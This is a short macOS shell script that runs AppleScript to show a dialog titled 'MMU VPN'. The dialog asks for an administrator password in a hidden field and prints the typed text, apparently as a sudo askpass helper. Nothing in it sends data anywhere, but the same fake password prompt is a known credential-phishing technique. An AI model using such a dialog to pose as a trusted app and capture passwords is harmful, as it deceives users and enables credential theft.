#!/bin/sh
/usr/bin/osascript <<'APPLESCRIPT'
display dialog "MMU VPN needs administrator permission." default answer "" with hidden answer buttons {"OK"} default button "OK" with title "MMU VPN"
text returned of result
APPLESCRIPT
